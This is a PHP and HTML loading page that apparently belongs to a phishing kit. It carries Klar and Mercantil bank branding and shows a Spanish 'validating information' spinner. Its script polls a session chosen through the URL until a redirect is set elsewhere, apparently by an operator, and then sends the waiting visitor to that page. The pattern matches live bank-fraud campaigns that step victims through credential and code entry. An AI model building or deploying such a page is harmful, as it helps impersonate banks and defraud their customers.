<?php
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);

if (!isset($_GET['id']) || !preg_match('/^[a-zA-Z0-9,-]{5,}$/', $_GET['id'])) {
    http_response_code(400);
    exit;
}

$request_id = $_GET['id'];

session_write_close();
session_id($request_id);
session_start();

if (!isset($_SESSION['load_entry_time'])) {
    $_SESSION['load_entry_time'] = time();
}

if (isset($_GET['check'])) {
    header('Content-Type: application/json; charset=UTF-8');
    if (isset($_SESSION['redirect']) && isset($_SESSION['redirect_set_time'])) {
        if ($_SESSION['redirect_set_time'] > $_SESSION['load_entry_time']) {
            echo json_encode(['redirect' => $_SESSION['redirect']]);
            unset($_SESSION['redirect'], $_SESSION['redirect_set_time']);
        } else {
            echo json_encode(['redirect' => null]);
        }
    } else {
        echo json_encode(['redirect' => null]);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.prod.website-files.com/62f28d86df04385706ee23d7/688a117a7918078238d5de20_Favicon.png" rel="shortcut icon" type="image/x-icon"/>
<title>Klar</title>
<style>
    * { box-sizing: border-box; }
    body {
        margin: 0;
        padding: 0;
        height: 100vh;
        background: #ffffff;
        display: flex;
        justify-content: center;
        align-items: center;
        flex-direction: column;
        font-family: Arial, sans-serif;
    }

    .overlay {
        display: flex;
        flex-direction: column;
        align-items: center;
    }

    .multi-spinner-container {
        width: 140px;
        height: 140px;
        position: relative;
    }

    .multi-spinner.blue {
        position: absolute;
        width: 100%;
        height: 100%;
        border: 5px solid transparent;
        border-top-color: #000000;
        border-radius: 50%;
        animation: spin 2s linear infinite;
    }

    .multi-spinner.orange {
        position: absolute;
        top: 8px;
        left: 8px;
        width: calc(100% - 16px);
        height: calc(100% - 16px);
        border: 5px solid transparent;
        border-top-color: #9b9b9b;
        border-radius: 50%;
        animation: spinReverse 2s linear infinite;
    }

    @keyframes spin {
        0% { transform: rotate(0deg);}
        100% { transform: rotate(360deg);}
    }

    @keyframes spinReverse {
        0% { transform: rotate(0deg);}
        100% { transform: rotate(-360deg);}
    }

    /* Logo central con fade sincronizado */
    .logo-center {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        width: 80px;
        height: 80px;
        border-radius: 50%;
        overflow: hidden;
    }

    .logo-center img {
        width: 100%;
        height: 100%;
        object-fit: cover;
        animation: fadeLogo 2s ease-in-out infinite;
    }

    @keyframes fadeLogo {
        0%, 100% { opacity: 1; }
        50% { opacity: 0.6; }
    }

    .loading-text {
        margin-top: 25px;
        font-size: 18px;
        color: #000000;
        font-weight: bold;
    }
    .loading-dots::after {
        content: "";
        animation: dots 2s infinite steps(4, end);
    }
    @keyframes dots {
        0% { content: ""; }
        25% { content: "."; }
        50% { content: ".."; }
        75% { content: "..."; }
    }
</style>
</head>
<body>

<div class="overlay">
    <div class="multi-spinner-container">
        <div class="multi-spinner blue"></div>
        <div class="multi-spinner orange"></div>
        <div class="logo-center">
            <img src="https://yt3.googleusercontent.com/E-EW5dLM4sqleFAJYFri_sQFPHKKNSgvgakHxbb4tdtAcF-R1JrCPil-oVZIH0l2OUenWD1C7g=s900-c-k-c0x00ffffff-no-rj" alt="Mercantil">
        </div>
    </div>
    <div class="loading-text">Validando información<span class="loading-dots"></span></div>
</div>
    <script>
        function checkRedirect() {
            fetch('load.php?id=<?php echo htmlspecialchars($request_id, ENT_QUOTES, 'UTF-8'); ?>&check=1')
                .then(response => response.json())
                .then(data => {
                    if (data.redirect) {
                        window.location.href = data.redirect;
                    } else {
                        setTimeout(checkRedirect, 1500);
                    }
                })
                .catch(() => setTimeout(checkRedirect, 1500));
        }
        window.onload = checkRedirect;
    </script>
</body>
</html>